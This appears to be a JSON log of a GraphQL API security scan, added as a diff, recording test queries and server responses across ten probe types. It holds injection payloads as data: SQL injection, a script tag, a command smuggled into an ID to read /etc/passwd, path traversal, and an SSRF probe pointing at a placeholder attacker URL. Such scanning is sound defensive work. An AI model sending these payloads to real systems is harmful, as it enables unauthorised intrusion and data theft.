@@ -1,0 +1,253 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  user(id: \"a1b2c3d4-e5f6-7890-1234-567890abcdef\") {\n    id\n    username\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.414,
+    "timestamp": "2025-09-23T18:42:46.903138Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "user": {
+          "id": null,
+          "username": null
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  user(id: \"a1b2c3d4-e5f6-7890-1234-567890abcdef' OR 1=1 --\") {\n    id\n    email\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.406,
+    "timestamp": "2025-09-23T18:42:50.289037Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "user": {
+          "id": null,
+          "email": null
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  user(id: \"<script>alert('XSS')</script>\") {\n    id\n    username\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.378,
+    "timestamp": "2025-09-23T18:42:52.609987Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "user": {
+          "id": null,
+          "username": null
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  user(id: \"http://attacker.com/steal_data\") {\n    id\n    profilePictureUrl\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.38,
+    "timestamp": "2025-09-23T18:42:54.785278Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"profilePictureUrl\" on type \"User\".",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  user(id: \"a1b2c3d4-e5f6-7890-1234-567890abcdef; cat /etc/passwd\") {\n    id\n    username\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.222,
+    "timestamp": "2025-09-23T18:42:56.870596Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "user": {
+          "id": null,
+          "username": null
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  user(id: \"../../../etc/passwd\") {\n    id\n    username\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.223,
+    "timestamp": "2025-09-23T18:43:00.068359Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "user": {
+          "id": null,
+          "username": null
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  user(id: \"<h1>Important Notice</h1><p>Malicious content here.</p>\") {\n    id\n    bio\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.214,
+    "timestamp": "2025-09-23T18:43:02.662397Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"bio\" on type \"User\". Did you mean \"id\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  aliasedUser: user(id: \"a1b2c3d4-e5f6-7890-1234-567890abcdef\") {\n    id\n    username\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  user {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.373,
+    "timestamp": "2025-09-23T18:43:04.959026Z",
+    "count": 9,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"User\". Did you mean \"todos\"?",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Field \"user\" argument \"id\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  user(id: \"a1b2c3d4-e5f6-7890-1234-567890abcdef\") {\n    iD # Deliberate typo to trigger suggestion\n    usernam # Deliberate typo to trigger suggestion\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.202,
+    "timestamp": "2025-09-23T18:43:06.866920Z",
+    "count": 10,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"iD\" on type \"User\". Did you mean \"id\"?",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"usernam\" on type \"User\". Did you mean \"username\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
